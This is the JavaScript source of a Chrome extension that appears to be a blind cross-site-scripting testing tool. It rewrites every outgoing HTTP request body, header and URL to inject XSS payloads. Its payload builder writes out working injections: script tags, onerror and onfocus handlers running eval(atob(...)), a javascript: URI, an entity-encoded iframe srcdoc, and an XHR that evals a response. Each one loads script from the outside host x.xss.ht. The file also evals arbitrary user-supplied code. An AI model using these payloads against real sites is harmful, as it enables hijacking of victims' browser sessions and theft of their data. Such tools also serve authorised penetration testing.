/*
 *  HTTP/HTTPS replacement rules. This a list of rules to replace key strings with XSS payloads with unique IDs.
 *
 *  EXAMPLE:
 *  {
 *      "data_location": "header" || "body" || "first_line" | "entire"
 *      "target_string": "dummystring" || false
 *      "premade_payload_id": 1 || 2 || 3
 *      "custom_javascript_processor": <javascript_code> || false
 *  }
 */
var request_replace_rules = [];

var user_domain = "x.xss.ht";

function get_rules( callback ) {
    chrome.storage.sync.get( "rules", function( result ) {
        rules = result["rules"];
        // Derived state, I know but it's for speed
        request_replace_rules = rules;
        callback( rules );
    });
}

function set_rules( rules, callback ) {
    chrome.storage.sync.set({"rules": rules}, function() {
        request_replace_rules = rules;
        callback( rules );
    });
}

function string_to_arraybuffer( str ) {
    var buf = new ArrayBuffer(str.length*2); // 2 bytes for each char
    var bufView = new Uint16Array(buf);
    for (var i=0, strLen=str.length; i<strLen; i++) {
        bufView[i] = str.charCodeAt(i);
    }
    return buf;
}

function arraybuffer_to_string( buffer ) {
    var dataView = new DataView( buffer );
    var decoder = new TextDecoder( "utf-8" );
    var decoded_string = decoder.decode( dataView );
    return decoded_string;
}

/*
 * Intercept all HTTP/HTTPS request bodies
 */
chrome.webRequest.onBeforeRequest.addListener(
    function( details ) {
        // Check to see if any rules apply to the current request body
        for( var q = 0; q < request_replace_rules.length; q++ ) {
            var tmp_regex = new RegExp( request_replace_rules[q]["target_string"], "g");

            // Check if rule matches in scope, is it either an entire request or a body match
            if( ( request_replace_rules[q]["data_location"].indexOf("entire") > -1 ) || ( request_replace_rules[q]["data_location"].indexOf("body") > -1 ) ) {
                // We will do the replacement automatically because checking for a match and then doing a replace is double the work.
                if( request_replace_rules[q]["custom_javascript_processor"] == "" ) {
                    if( "requestBody" in details ) {
                        if( "formData" in details.requestBody ) {
                            for( var form_name in details.requestBody.formData ) {
                                if( details.requestBody.formData.hasOwnProperty( form_name ) ) {
                                    // Replace form value
                                    for( var i = 0; i < details.requestBody.formData[ form_name ]; i++ ) {
                                        details.requestBody.formData[ form_name ][i] = details.requestBody.formData[ form_name ][i].replace( tmp_regex, get_payload_from_id( request_replace_rules[q]["premade_payload_id"] ) );
                                    }
                                    console.log( details.requestBody.formData );

                                    // Replace form name
                                    var tmp_form_name = form_name.replace( tmp_regex, get_payload_from_id( request_replace_rules[q]["premade_payload_id"] ) );
                                    var hold_param_value = details.requestBody.formData[ form_name ];
                                    delete details.requestBody.formData[ form_name ];
                                    details.requestBody.formData[ tmp_form_name ] = hold_param_value;
                                }
                            }
                        } else if ( "raw" in details.requestBody ) {
                            //console.log( details.requestBody.raw[0]["bytes"] );
                            if( details.requestBody.raw.length > 0 && "bytes" in details.requestBody.raw[0] ) {
                                var decoded_string = arraybuffer_to_string( details.requestBody.raw[0]["bytes"] );
                                var new_arraybuffer = string_to_arraybuffer( decoded_string );
                                details.requestBody.raw[0]["bytes"] = new_arraybuffer;
                            }
                        }
                    }
                } else {
                    // Run custom JavaScript
                    eval( request_replace_rules[q]["custom_javascript_processor"] );
                }
            }

            // Check if rule matches in scope, is it either an entire request or just the first line?
            if( ( request_replace_rules[q]["data_location"].indexOf("entire") > -1 ) || ( request_replace_rules[q]["data_location"].indexOf("first_line") > -1 ) ) {
                // We will do the replacement automatically because checking for a match and then doing a replace is double the work.
                if( request_replace_rules[q]["custom_javascript_processor"] == "" ) {
                    details["method"] = details["method"].replace( tmp_regex, get_payload_from_id( request_replace_rules[q]["premade_payload_id"] ) );
                    details["url"] = details["url"].replace( tmp_regex, get_payload_from_id( request_replace_rules[q]["premade_payload_id"] ) );
                } else {
                    // Run custom JavaScript
                    eval( request_replace_rules[q]["custom_javascript_processor"] );
                }
            }

        }
    },
    {
        urls: ["<all_urls>"]
    },
    ["blocking", "requestBody"]
);

/*
 * Intercept all HTTP/HTTPS request headers
 */
chrome.webRequest.onBeforeSendHeaders.addListener(
    function( details ) {
        for (var i = 0; i < details.requestHeaders.length; ++i) {
            // Check to see if any rules apply to the current header
            for( var q = 0; q < request_replace_rules.length; q++ ) {
                var tmp_regex = new RegExp( request_replace_rules[q]["target_string"], "g");
                // Check if rule matches in scope, is it either an entire request replace or a header replace?
                if( ( request_replace_rules[q]["data_location"].indexOf("entire") > -1 ) || ( request_replace_rules[q]["data_location"].indexOf("header") > -1 ) ) {
                    // We will do the replacement automatically because checking for a match and then doing a replace is double the work.
                    if( request_replace_rules[q]["custom_javascript_processor"] == "" ) {
                        details.requestHeaders[i]["name"] = details.requestHeaders[i]["name"].replace( tmp_regex, get_payload_from_id( request_replace_rules[q]["premade_payload_id"] ) );
                        details.requestHeaders[i]["value"] = details.requestHeaders[i]["value"].replace( tmp_regex, get_payload_from_id( request_replace_rules[q]["premade_payload_id"] ) );
                    } else {
                        // Run custom JavaScript
                        eval( request_replace_rules[q]["custom_javascript_processor"] );
                    }
                }
            }
            //console.log( details.requestHeaders[i] );
        }
        return {
            "requestHeaders": details.requestHeaders
        }
    },
    {
        urls: ["<all_urls>"]
    },
    ["blocking", "requestHeaders"]
);

function html_encode( value ){
    return String( value ).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;').replace( /=/g, '&#61;' ).replace( / /g, '&#32;' );
}

// Turn the form id into a proper XSS payload like "><script src=https://example.xss.ht></script>
function get_payload_from_id( payload_id ) {
    var domain = user_domain;
    var js_attrib_js = 'var a=document.createElement("script");a.src="https://' + domain + '";document.body.appendChild(a);';
    var generic_script_tag_payload = "\"><script src=https://" + domain + "></script>";
    var image_tag_payload = "\"><img src=x id=" + html_encode( btoa( js_attrib_js ) ) + " onerror=eval(atob(this.id))>";
    var javascript_uri_payload = "javascript:eval('var a=document.createElement(\\'script\\');a.src=\\'https://" + domain + "\\';document.body.appendChild(a)')";
    var input_tag_payload = "\"><input onfocus=eval(atob(this.id)) id=" + html_encode( btoa( js_attrib_js ) ) + " autofocus>";
    var source_tag_payload = "\"><video><source onerror=eval(atob(this.id)) id=" + html_encode( btoa( js_attrib_js ) ) + ">";
    var srcdoc_tag_payload = "\"><iframe srcdoc=\"&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#118;&#97;&#114;&#32;&#97;&#61;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#99;&#114;&#101;&#97;&#116;&#101;&#69;&#108;&#101;&#109;&#101;&#110;&#116;&#40;&#34;&#115;&#99;&#114;&#105;&#112;&#116;&#34;&#41;&#59;&#97;&#46;&#115;&#114;&#99;&#61;&#34;&#104;&#116;&#116;&#112;&#115;&#58;&#47;&#47;" + domain + "&#34;&#59;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#98;&#111;&#100;&#121;&#46;&#97;&#112;&#112;&#101;&#110;&#100;&#67;&#104;&#105;&#108;&#100;&#40;&#97;&#41;&#59;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;\">";
    var xhr_payload = '<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//' + domain + '");a.send();</script>'
    var getscript_payload = '<script>$.getScript("//' + domain + '")</script>';

    // Gross
    switch ( payload_id ) {
        case "generic_script_tag_payload":
            return generic_script_tag_payload;
        break;
        case "javascript_uri_payload":
            return javascript_uri_payload;
        break;
        case "input_tag_payload":
            return input_tag_payload;
        break;
        case "img_tag_payload":
            return img_tag_payload;
        break;
        case "source_tag_payload":
            return source_tag_payload;
        break;
        case "srcdoc_tag_payload":
            return srcdoc_tag_payload;
        break;
        case "xhr_payload":
            return xhr_payload;
        break;
        default:
            return false;
    }
}

function set_form_from_rule( rule ) {
    var cm = $('.CodeMirror')[0].CodeMirror;
    $(cm.getWrapperElement()).hide();

    $( "#rule_id" ).val( rule["id"] );
    $( "#target_string" ).val( rule["target_string"] );

    // Selecter is the bane of my existance, I wish for the cool embrace of death.
    var select_elements = $(".target_string_location_select_div");
    for( var i = 0; i < rule["data_location"].length; i++ ) {
        $( select_elements ).find( "[data-value=" + rule["data_location"][i] + "]").addClass( "selected" );
    }

    var payload_select_div_element = $( ".payload_select_div" ).find( ".selecter-selected" ).text( $( ".payload_select_div" ).find( "[value=" + rule["premade_payload_id"] + "]" ).text() );
    $( ".payload_select" ).val( rule["premade_payload_id"] );

    if( rule["premade_payload_id"] === "custom_javascript" ) {
        $(cm.getWrapperElement()).show();
        cm.setValue( rule["custom_javascript_processor"] );
        cm.focus();
        cm.setCursor({
            "line":1
        })
    }

}

function get_rule_from_inputs() {
    var rule = {};

    // God dammit bootflat is so half assed, I will never use this shitty bootstrap thing ever again
    var select_elements = $(".target_string_location_select_div").find( ".selecter-item.selected");
    var selected_target_strings = [];
    for( var i = 0; i < select_elements.length; i++ ) {
        selected_target_strings.push( select_elements[i].getAttribute("data-value") );
    }
    rule["target_string"] = $( "#target_string" ).val();
    rule["premade_payload_id"] = $( ".payload_select" ).val();
    rule["data_location"] = selected_target_strings;
    rule["custom_javascript_processor"] = $('.CodeMirror')[0].CodeMirror.getValue();
    rule["id"] = $( "#rule_id").val();

    return rule;
}

function get_rule_by_id( id ) {
    for( var i = 0; i < request_replace_rules.length; i++ ) {
        if( request_replace_rules[i]["id"] == id ) {
            return request_replace_rules[i];
        }
    }
    return undefined;
}

function delete_rule_by_id( id, callback ) {
    get_rules( function( rules ) {
        var rule_to_delete = get_rule_by_id( id );
        var index = rules.indexOf( rule_to_delete );
        rules.splice( index, 1 );
        set_rules( rules, function( new_rules ) {
            update_rules_list_gui();
            callback();
        });
    });
}

function update_rule() {
    var current_rule = get_rule_from_inputs();
    delete_rule_by_id( current_rule["id"], function() {
        get_rules( function( rules ) {
            rules.push( current_rule );
            console.log( "New rules:", rules );
            set_rules( rules, function( new_rules ) {
                update_rules_list_gui();
            });
        });
    });
}

function update_rules_list_gui() {
    $( ".rules_list" ).empty();
    var rule_template = $.parseHTML( '<a href="#" class="list-group-item"></a>' )[0];
    get_rules( function( rules ){
        for( var i = 0; i < rules.length; i++ ) {
            var new_rule_element = rule_template.cloneNode(true);
            new_rule_element.innerText = rules[i]["target_string"];
            new_rule_element.id = rules[i]["id"];
            $( ".rules_list" ).append( new_rule_element );
            $( "#" + rules[i]["id"] ).click(function() {
                clear_rule_gui();
                var tmp_rule = get_rule_by_id( this.id );
                set_form_from_rule( tmp_rule );
                $( ".update_rule_button" ).show();
                $( ".cancel_rule_button" ).show();
                $( ".delete_rule_button" ).show();
                $( ".add_rule_button" ).hide();
            });
        }
    });
}

function guid() {
    function s4() {
        return Math.floor((1 + Math.random()) * 0x10000)
        .toString(16)
        .substring(1);
    }
    return s4() + s4() + '-' + s4() + '-' + s4() + '-' +
        s4() + '-' + s4() + s4() + s4();
}

function clear_rule_gui() {
    $( "#target_string" ).val("");
    var payload_select_div_element = $( ".payload_select_div" ).find( ".selecter-selected" ).text( $( ".payload_select_div" ).find( "[value=generic_script_tag_payload]" ).text() );
    $( ".payload_select" ).val( "generic_script_tag_payload" );
    var select_elements = $(".target_string_location_select_div");
    $( select_elements ).find( ".selecter-item" ).removeClass( "selected" );
    try {
        var cm = $('.CodeMirror')[0].CodeMirror;
        $(cm.getWrapperElement()).hide();
    } catch ( e ) {}
    $( "#rule_id" ).val( "" );
}

// Onload update the rules
update_rules_list_gui();

$( ".update_rule_button" ).click( function() {
    $( ".update_rule_button" ).toggle();
    $( ".cancel_rule_button" ).toggle();
    $( ".delete_rule_button" ).toggle();
    $( ".add_rule_button" ).toggle();
    update_rule();
    clear_rule_gui();
    update_rules_list_gui();
});

$( ".delete_rule_button" ).click( function() {
    $( ".update_rule_button" ).toggle();
    $( ".cancel_rule_button" ).toggle();
    $( ".delete_rule_button" ).toggle();
    $( ".add_rule_button" ).toggle();
    var rule_id = $( "#rule_id" ).val();
    delete_rule_by_id( rule_id, function() {
        clear_rule_gui();
    });
});

$( ".cancel_rule_button" ).click( function() {
    $( ".update_rule_button" ).toggle();
    $( ".cancel_rule_button" ).toggle();
    $( ".delete_rule_button" ).toggle();
    $( ".add_rule_button" ).toggle();
    clear_rule_gui();
});


$( ".add_rule_button" ).click( function() {
    var new_rule = get_rule_from_inputs();
    new_rule["id"] = guid();
    get_rules( function( rules ){
        rules.push( new_rule );
        set_rules( rules, function( tmp_rules ) {
            update_rules_list_gui( rules );
            clear_rule_gui();
        });
    });
});

var editor = CodeMirror.fromTextArea( document.getElementById("custom_javascript_editor"), {
    lineNumbers: false,
    mode: "javascript",
    cursorBlinkRate: 1000,
    matchBrackets: true,
});

$(".payload_select").change( function(){
    var payload = $(".payload_select").val();

    var cm = $('.CodeMirror')[0].CodeMirror;
    if( payload === "custom_javascript" ) {
        $(cm.getWrapperElement()).show();
        cm.getDoc().setValue('var msg = "Hi";');
        cm.focus();
        cm.setCursor({
            "line":1
        })
    } else {
        $(cm.getWrapperElement()).hide();
    }
});
